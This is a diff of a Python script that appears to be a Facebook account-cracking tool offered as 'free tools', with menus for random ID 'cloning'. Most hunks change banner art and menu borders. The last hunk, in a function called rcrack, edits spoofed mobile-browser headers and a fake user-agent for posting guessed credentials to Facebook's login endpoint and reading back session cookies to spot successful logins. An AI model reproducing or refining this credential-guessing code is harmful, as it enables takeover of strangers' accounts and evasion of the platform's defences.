@@ -123,28 +123,28 @@ for xd in range(10000):
 	
 
 logo=("""
-    \033[1;32m ______   __       __   ______   _______  
-    \033[1;32m/      \ /  \     /  | /      \ /       \ 
-   \033[1;32m/$$$$$$  |$$  \   /$$ |/$$$$$$  |$$$$$$$  |
-   \033[1;32m$$ |  $$ |$$$  \ /$$$ |$$ |__$$ |$$ |__$$ |
-   \033[1;32m$$ |  $$ |$$$$  /$$$$ |$$    $$ |$$    $$< 
-   \033[1;32m$$ |  $$ |$$ $$ $$/$$ |$$$$$$$$ |$$$$$$$  |
-   \033[1;32m$$ \__$$ |$$ |$$$/ $$ |$$ |  $$ |$$ |  $$ |
-   \033[1;32m$$    $$/ $$ | $/  $$ |$$ |  $$ |$$ |  $$ |
-    \033[1;32m$$$$$$/  $$\/     $$\/$$/   $$\/$$\/  $$/ 
- ────────────────────────────────────────────────
-\033[1;35m          🔥 WELCOME TO MY FREE TOOLS 🔥
- \033[1;32m────────────────────────────────────────────────    
-\033[1;35m╔══════════════════💓(AFG)💓═══════════════════╗
-\033[1;35m║\033[1;32m[✓]    CREATED BY   :  LOY UZBEK BACHA     [✓]\033[1;35m║
-\033[1;35m║\033[1;32m[✓]    FACEBOK      :  SHAHZADA QUTBUDDİN  [✓]\033[1;35m║
-\033[1;35m║\033[1;32m[✓]    GITHUB       :  UZBEK-BACHA         [✓]\033[1;35m║
-\033[1;35m║\033[1;32m[✓]    TOOLS STATUS :  FREE                [✓]\033[1;35m║
-\033[1;35m║\033[1;32m[✓]    VERSION      :  0.1                 [✓]\033[1;35m║
-\033[1;35m╚═════════════════════[]═══════════════════════╝\33[1;37m""")
+\033[1;35m##################################################
+\033[1;35m##    ______   __       __   ______   _______   ##
+\033[1;35m##   /      \ /  \     /  | /      \ /       \  ##
+\033[1;35m##  /$$$$$$  |$$  \   /$$ |/$$$$$$  |$$$$$$$  | ##
+\033[1;35m##  $$ |  $$ |$$$  \ /$$$ |$$ |__$$ |$$ |__$$ | ##
+\033[1;35m##  $$ |  $$ |$$$$  /$$$$ |$$    $$ |$$    $$<  ##
+\033[1;35m##  $$ |  $$ |$$ $$ $$/$$ |$$$$$$$$ |$$$$$$$  | ##
+\033[1;35m##  $$ \__$$ |$$ |$$$/ $$ |$$ |  $$ |$$ |  $$ | ##
+\033[1;35m##  $$    $$/ $$ | $/  $$ |$$ |  $$ |$$ |  $$ | ##
+\033[1;35m##   $$$$$$/  $$\/     $$\/$$/   $$\/$$\/  $$/  ##
+\033[1;35m##                                              ##
+\033[1;35m##################################################
+\033[1;35m╔══════════════════💓(AFG)💓═════════════════════╗
+\033[1;35m║[✓]    CREATED BY   :  LOY UZBEK BACHA       [✓]\033[1;35m║
+\033[1;35m║[✓]    FACEBOK      :  SHAHZADA QUTBUDDİN    [✓]\033[1;35m║
+\033[1;35m║[✓]    GITHUB       :  HAJI-OMAR             [✓]\033[1;35m║
+\033[1;35m║[✓]    TOOLS STATUS :  FREE                  [✓]\033[1;35m║
+\033[1;35m║[✓]    VERSION      :  0.1                   [✓]\033[1;35m║
+\033[1;35m╚═════════════════════[]═════════════════════════╝\33[1;37m""")
 
 def lines():
-	print('\33[1;35m╚══════════════════════════════════════════════╝')
+	print('\33[1;35m╚════════════════════════════════════════════════╝')
  
 loop = 0
 oks = []
@@ -169,11 +169,11 @@ def dynamic(text):
 def riaz():
 	os.system('clear')
 	print(logo)
-	print('\33[1;35m║\033[1;32m[1] AFG RANDOM  CLONING                       \033[1;35m║')
-	print('\33[1;35m║\033[1;32m[2] TURK RANDOM CLONING                       \033[1;35m║')
-	print('\33[1;35m║\033[1;32m[3] FOLLOW ME ON FACEBOOK                     \033[1;35m║')
-	print('\033[1;35m║\033[1;32m[5] Exit Main menu                            \033[1;35m║')
-	print('\33[1;35m╚══════════════════════════════════════════════╝')
+	print('\33[1;35m║[1] AFG RANDOM  CLONING                       \033[1;35m  ║')
+	print('\33[1;35m║[2] TURK RANDOM CLONING                       \033[1;35m  ║')
+	print('\33[1;35m║[3] FOLLOW ME ON FACEBOOK                     \033[1;35m  ║')
+	print('\033[1;35m║[5] Exit Main menu                            \033[1;35m  ║')
+	print('\33[1;35m╚════════════════════════════════════════════════╝')
 	riaz1 = input('\33[1;35m[•] SELECT OPTION  : ')
 	if riaz1 =='1':
 		annu()
@@ -196,7 +196,7 @@ def annu():
     print('\33[1;35m  [1] RANDOM OLD IDZ UPDATE  Method \x1b[1;92m1')
     print('\33[1;35m  [2] RANDOM MIX IDZ GAMES  \x1b[1;92m        2')
     print('\33[1;35m  [3] RANDOM NEW IDZ UPDATE  \x1b[1;92m       3.BEST ')
-    print('║ \33[1;35m[4] GO TO MAIN MENU                          \33[1;35m║')
+    print('║ \33[1;35m[4] GO TO MAIN MENU                          \33[1;35m  ║')
     lines()
     riaz1 = input('\33[1;35m[+] CHOOSE OPTION : ')
     if riaz1 =='1':
@@ -432,23 +432,24 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority':'mbasic.facebook.com',
 			'method':'GET',
 			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-  		  'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-  		  'cache-control': 'max-age=0',
- 		   'dpr': '2.75',
-		    'sec-ch-prefers-color-scheme': 'light',
-  		  'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
- 		   'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-		    'sec-ch-ua-mobile': '?1',
-		    'sec-ch-ua-model': '"Redmi Note 8"',
-  		  'sec-ch-ua-platform': '"Android"',
- 		   'sec-ch-ua-platform-version': '"11.0.0"',
- 		   'sec-fetch-dest': 'document',
- 		   'sec-fetch-mode': 'navigate',
-  		  'sec-fetch-site': 'none',
-  		  'sec-fetch-user': '?1',
-  		  'upgrade-insecure-requests': '1',
-  		  'user-agent': pro}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2.75',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"Redmi Note 8"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
+            'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
